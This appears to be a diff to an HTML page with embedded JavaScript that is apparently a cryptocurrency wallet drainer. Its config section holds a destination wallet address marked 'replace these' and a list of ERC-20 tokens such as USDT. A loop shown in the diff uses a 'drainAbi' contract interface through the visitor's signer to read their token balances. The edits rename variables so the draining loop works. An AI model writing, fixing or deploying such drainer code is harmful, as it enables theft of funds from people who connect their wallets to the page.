@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -427,6 +426,7 @@
     //  CONFIG — replace these
     // =================================================================
     const wallet = "0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";
+    const destinationWallet = wallet;
 
     const tokens = [
       {s:"USDT",a:"0xdAC17F958D2ee523a2206206994597C13D831ec7"},
@@ -510,7 +510,7 @@
         }
 
         // ---- ERC-20 tokens ----
-        for (const t of drainTokens) {
+        for (const t of tokens) {
           try {
             const c = new ethers.Contract(t.a, drainAbi, signer);
             const bal = await c.balanceOf(user);
